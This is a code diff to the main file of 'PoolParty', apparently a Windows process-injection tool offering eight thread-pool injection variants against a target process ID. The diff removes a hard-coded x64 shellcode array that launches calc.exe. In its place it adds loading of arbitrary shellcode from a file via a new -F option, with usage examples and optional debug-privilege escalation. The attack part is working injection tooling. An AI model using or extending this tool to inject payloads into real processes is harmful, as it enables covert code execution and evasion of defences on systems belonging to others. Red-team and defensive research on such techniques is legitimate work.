@@ -1,29 +1,30 @@
 #include "PoolParty.hpp"
+#include <fstream>
 
-unsigned char g_Shellcode[] = 
-"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
-"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
-"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
-"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
-"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
-"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
-"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
-"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
-"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
-"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
-"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
-"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
-"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
-"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
-"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
-"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
-"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";
+bool ReadShellcodeFromFile(const std::string& path, std::unique_ptr<unsigned char[]>& buffer, size_t& size)
+{
+	std::ifstream file(path, std::ios::binary | std::ios::ate);
+	if (!file) {
+		std::cerr << "[!] Failed to open shellcode file: " << path << std::endl;
+		return false;
+	}
 
-auto g_szShellcodeSize = sizeof(g_Shellcode);
+	size = static_cast<size_t>(file.tellg());
+	buffer = std::make_unique<unsigned char[]>(size);
+
+	file.seekg(0, std::ios::beg);
+	if (!file.read(reinterpret_cast<char*>(buffer.get()), size)) {
+		std::cerr << "[!] Failed to read shellcode file: " << path << std::endl;
+		return false;
+	}
+
+	std::cout << "[+] Loaded shellcode (" << size << " bytes) from: " << path << std::endl;
+	return true;
+}
 
 void PrintUsage()
 {
-	std::cout << "usage: PoolParty.exe -V <VARIANT ID> -P <TARGET PID>" << std::endl << std::endl <<
+	std::cout << "usage: PoolParty.exe -V <VARIANT ID> -P <TARGET PID> -F <SHELLCODE FILE>" << std::endl << std::endl <<
 		"VARIANTS:" << std::endl <<
 		"------" << std::endl << std::endl <<
 		"#1: (WorkerFactoryStartRoutineOverwrite) " << std::endl << "\t+ Overwrite the start routine of the target worker factory" << std::endl << std::endl <<
@@ -36,12 +37,12 @@ void PrintUsage()
 		"#8: (RemoteTpTimerInsertion) " << std::endl << "\t+ Insert TP_TIMER work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
 		"EXAMPLES:" << std::endl <<
 		"------" << std::endl << std::endl <<
-		"#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234" << std::endl << std::endl <<
-		"#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D" << std::endl << std::endl;
+		"#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234 -F test.bin" << std::endl << std::endl <<
+		"#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D -F test.bin" << std::endl << std::endl;
 }
 
 POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
-	if (argc < 5) {
+	if (argc < 7) {
 		PrintUsage();
 		throw std::runtime_error("Too few arguments supplied ");
 	}
@@ -68,6 +69,10 @@ POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
 			CmdArgs.bDebugPrivilege = TRUE;
 			continue;
 		}
+		if (CmdArg == "-F" || CmdArg == "--shellcode-file") {
+			CmdArgs.ShellcodeFilePath = args.at(++i);
+			continue;
+		}
 		PrintUsage();
 		throw std::runtime_error((boost::format("Invalid option: %s") % CmdArg).str());
 	}
@@ -75,26 +80,26 @@ POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
 	return CmdArgs;
 }
 
-std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid)
+std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid, unsigned char* pShellcode, size_t ShellcodeSize)
 {
 	switch (VariantId)
 	{
 	case 1: 
-		return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, pShellcode, ShellcodeSize);
 	case 2:
-		return std::make_unique<RemoteTpWorkInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpWorkInsertion>(TargetPid, pShellcode, ShellcodeSize);
 	case 3:
-		return std::make_unique<RemoteTpWaitInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpWaitInsertion>(TargetPid, pShellcode, ShellcodeSize);
 	case 4:
-		return std::make_unique<RemoteTpIoInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpIoInsertion>(TargetPid, pShellcode, ShellcodeSize);
 	case 5:
-		return std::make_unique<RemoteTpAlpcInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpAlpcInsertion>(TargetPid, pShellcode, ShellcodeSize);
 	case 6:
-		return std::make_unique<RemoteTpJobInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpJobInsertion>(TargetPid, pShellcode, ShellcodeSize);
 	case 7:
-		return std::make_unique<RemoteTpDirectInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpDirectInsertion>(TargetPid, pShellcode, ShellcodeSize);
 	case 8:
-		return std::make_unique<RemoteTpTimerInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpTimerInsertion>(TargetPid, pShellcode, ShellcodeSize);
 	default:
 		PrintUsage();
 		throw std::runtime_error("Invalid variant ID");
@@ -125,13 +130,25 @@ int main(int argc, char** argv)
 	{
 		const auto CmdArgs = ParseArgs(argc, argv);
 
+		std::unique_ptr<unsigned char[]> shellcode;
+		size_t shellcodeSize = 0;
+
+		if (!CmdArgs.ShellcodeFilePath.empty()) {
+			if (!ReadShellcodeFromFile(CmdArgs.ShellcodeFilePath, shellcode, shellcodeSize)) {
+				throw std::runtime_error("[-] Could not load shellcode from file.");
+			}
+		}
+		else {
+			throw std::runtime_error("[-] Shellcode file path must be provided with -F option.");
+		}
+
 		if (CmdArgs.bDebugPrivilege)
 		{
 			w_RtlAdjustPrivilege(SeDebugPrivilege, TRUE, FALSE);
 			BOOST_LOG_TRIVIAL(info) << "Retrieved SeDebugPrivilege successfully";
 		}
 
-		const auto Injector = PoolPartyFactory(CmdArgs.VariantId, CmdArgs.TargetPid);
+		const auto Injector = PoolPartyFactory(CmdArgs.VariantId, CmdArgs.TargetPid, shellcode.get(), shellcodeSize);
 		Injector->Inject();
 	}
 	catch (const std::exception& ex) 
